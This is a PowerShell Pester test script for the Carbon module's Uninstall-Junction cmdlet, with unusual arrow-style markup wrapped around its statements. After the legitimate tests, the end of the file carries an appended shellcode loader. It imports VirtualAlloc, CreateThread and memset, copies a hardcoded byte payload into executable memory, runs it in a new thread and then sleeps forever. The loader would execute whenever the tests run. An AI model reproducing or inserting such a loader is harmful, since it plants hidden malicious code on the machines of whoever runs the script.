











 -||-> & ( -||-> Join-Path -Path $PSScriptRoot 'Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 

 -||-> Describe 'Uninstall-Junction' {
     -||-> $JunctionPath = $null <-||- 
     -||-> $tempDir =  -||-> Get-Item -Path 'TestDrive:' <-||-  <-||- 

     -||-> BeforeEach {
         -||-> $Global:Error.Clear() <-||- 
         -||-> $JunctionPath =  -||-> Join-Path $tempDir ( -||-> [IO.Path]::GetRandomFileName() <-||- ) <-||-  <-||- 
         -||-> New-Junction $JunctionPath $PSScriptRoot <-||- 
    } <-||- 
    
     -||-> AfterEach {
         -||-> if(  -||-> Test-Path $JunctionPath -PathType Container <-||-  )
        {
             -||-> cmd /c rmdir $JunctionPath <-||- 
        } <-||- 
    } <-||- 
    
     -||-> function Invoke-UninstallJunction($junction)
    {
         -||-> Uninstall-Junction $junction <-||- 
    } <-||- 
    
     -||-> It 'should uninstall junction' {
         -||-> Invoke-UninstallJunction $JunctionPath <-||- 
         -||-> $Global:Error.Count | Should Be 0 <-||- 
         -||-> $JunctionPath | Should Not Exist <-||- 
         -||-> $PSScriptRoot | Should Exist <-||- 
    } <-||- 
    
     -||-> It 'should fail if junction actually a directory' {
         -||-> $realDir =  -||-> Join-Path $tempDir ( -||-> [IO.Path]::GetRandomFileName() <-||- ) <-||-  <-||- 
         -||-> New-Item $realDir -ItemType 'Directory' <-||- 
         -||-> $error.Clear() <-||- 
         -||-> Invoke-UninstallJunction $realDir 2> $null <-||- 
         -||-> $Global:Error.Count | Should BeGreaterThan 0 <-||- 
         -||-> $Global:Error[0] | Should Match 'is a directory' <-||- 
         -||-> $realDir | Should Exist <-||- 
         -||-> Remove-Item $realDir <-||- 
    } <-||- 
    
     -||-> It 'should fail if junction actually a file' {
         -||-> $path = [IO.Path]::GetTempFileName() <-||- 
         -||-> $error.Clear() <-||- 
         -||-> Invoke-UninstallJunction $path 2> $null <-||- 
         -||-> $Global:Error.Count | Should BeGreaterThan 0 <-||- 
         -||-> $Global:Error[0] | Should Match 'is a file' <-||- 
         -||-> $path | Should Exist <-||- 
         -||-> Remove-Item $path <-||- 
    } <-||- 
    
     -||-> It 'should support what if' {
         -||-> Uninstall-Junction -Path $JunctionPath -WhatIf <-||- 
         -||-> $JunctionPath | Should Exist <-||- 
         -||-> ( -||-> Join-Path $JunctionPath ( -||-> Split-Path $PSCommandPath -Leaf <-||- ) <-||- ) | Should Exist <-||- 
         -||-> $PSScriptRoot | Should Exist <-||- 
    } <-||- 
    
     -||-> It 'should remove junction with relative path' {
         -||-> $parentDir =  -||-> Split-Path -Parent -Path $JunctionPath <-||-  <-||- 
         -||-> $junctionName =  -||-> Split-Path -Leaf -Path $JunctionPath <-||-  <-||- 
         -||-> Push-Location $parentDir <-||- 
         -||-> try
        {
             -||-> Uninstall-Junction -Path ".\$junctionName" <-||- 
             -||-> $JunctionPath | Should Not Exist <-||- 
             -||-> $PSScriptRoot | Should Exist <-||- 
        }
        finally
        {
             -||-> Pop-Location <-||- 
        } <-||- 
    } <-||- 

     -||-> It 'should silently not remove a non-existent junction with wildcards' {
         -||-> $path =  -||-> Join-Path -Path $tempDir -ChildPath 'withwildcards[]' <-||-  <-||- 
         -||-> Uninstall-Junction -Path $path <-||- 
         -||-> $Global:Error.Count | Should Be 0 <-||- 
    } <-||- 

     -||-> It 'should remove a junction with wildcards' {
         -||-> $path =  -||-> Join-Path -Path $tempDir -ChildPath 'withwildcards[]' <-||-  <-||- 
         -||-> Install-Junction -Link $path -Target $PSScriptRoot <-||- 
         -||-> Uninstall-Junction -LiteralPath $path <-||- 
         -||-> $Global:Error.Count | Should Be 0 <-||- 
         -||-> Test-Path -LiteralPath $path | Should Be $false <-||- 
    } <-||- 

     -||-> It 'should only delete junctions when using wildcards' {
         -||-> $filePath =  -||-> Join-Path -Path $tempDir -ChildPath 'file' <-||-  <-||- 
         -||-> New-Item -Path $filePath -ItemType 'file' <-||- 
         -||-> $dirPath =  -||-> Join-Path -Path $tempDir -ChildPath 'dir' <-||-  <-||- 
         -||-> New-Item -Path $dirPath -ItemType 'Directory' <-||- 
         -||-> $secondJunction =  -||-> Join-Path -Path $tempDir -ChildPath 'junction2' <-||-  <-||- 
         -||-> Install-Junction -Link $secondJunction -Target $PSScriptRoot <-||- 

         -||-> Uninstall-Junction -Path ( -||-> Join-Path -Path $tempDir -ChildPath '*' <-||- ) <-||- 
         -||-> $Global:Error.Count | Should Be 0 <-||- 
         -||-> $filePath | Should Exist <-||- 
         -||-> $dirPath | Should Exist <-||- 
         -||-> $JunctionPath | Should Not Exist <-||- 
         -||-> $secondJunction | Should not Exist <-||- 
    } <-||- 
    
} <-||- 

 -||-> $rkdm = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $rkdm -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbe,0x69,0xe6,0xfe,0xe9,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x77,0x13,0x03,0x77,0x13,0x83,0xef,0x95,0x04,0x0b,0x15,0x8d,0x4b,0xf4,0xe6,0x4d,0x2c,0x7c,0x03,0x7c,0x6c,0x1a,0x47,0x2e,0x5c,0x68,0x05,0xc2,0x17,0x3c,0xbe,0x51,0x55,0xe9,0xb1,0xd2,0xd0,0xcf,0xfc,0xe3,0x49,0x33,0x9e,0x67,0x90,0x60,0x40,0x56,0x5b,0x75,0x81,0x9f,0x86,0x74,0xd3,0x48,0xcc,0x2b,0xc4,0xfd,0x98,0xf7,0x6f,0x4d,0x0c,0x70,0x93,0x05,0x2f,0x51,0x02,0x1e,0x76,0x71,0xa4,0xf3,0x02,0x38,0xbe,0x10,0x2e,0xf2,0x35,0xe2,0xc4,0x05,0x9c,0x3b,0x24,0xa9,0xe1,0xf4,0xd7,0xb3,0x26,0x32,0x08,0xc6,0x5e,0x41,0xb5,0xd1,0xa4,0x38,0x61,0x57,0x3f,0x9a,0xe2,0xcf,0x9b,0x1b,0x26,0x89,0x68,0x17,0x83,0xdd,0x37,0x3b,0x12,0x31,0x4c,0x47,0x9f,0xb4,0x83,0xce,0xdb,0x92,0x07,0x8b,0xb8,0xbb,0x1e,0x71,0x6e,0xc3,0x41,0xda,0xcf,0x61,0x09,0xf6,0x04,0x18,0x50,0x9e,0xe9,0x11,0x6b,0x5e,0x66,0x21,0x18,0x6c,0x29,0x99,0xb6,0xdc,0xa2,0x07,0x40,0x23,0x99,0xf0,0xde,0xda,0x22,0x01,0xf6,0x18,0x76,0x51,0x60,0x89,0xf7,0x3a,0x70,0x36,0x22,0xd6,0x75,0xa0,0x0d,0x8f,0x77,0x36,0xe6,0xd2,0x77,0x26,0x17,0x5b,0x91,0x16,0x87,0x0c,0x0e,0xd6,0x77,0xed,0xfe,0xbe,0x9d,0xe2,0x21,0xde,0x9d,0x28,0x4a,0x74,0x72,0x85,0x22,0xe0,0xeb,0x8c,0xb9,0x91,0xf4,0x1a,0xc4,0x91,0x7f,0xa9,0x38,0x5f,0x88,0xc4,0x2a,0x37,0x78,0x93,0x11,0x91,0x87,0x09,0x3f,0x1d,0x12,0xb6,0x96,0x4a,0x8a,0xb4,0xcf,0xbc,0x15,0x46,0x3a,0xb7,0x9c,0xd2,0x85,0xaf,0xe0,0x32,0x06,0x2f,0xb7,0x58,0x06,0x47,0x6f,0x39,0x55,0x72,0x70,0x94,0xc9,0x2f,0xe5,0x17,0xb8,0x9c,0xae,0x7f,0x46,0xfb,0x99,0xdf,0xb9,0x2e,0x18,0x23,0x6c,0x16,0x6e,0x4d,0xac <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $I0C6=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $I0C6.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$I0C6,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



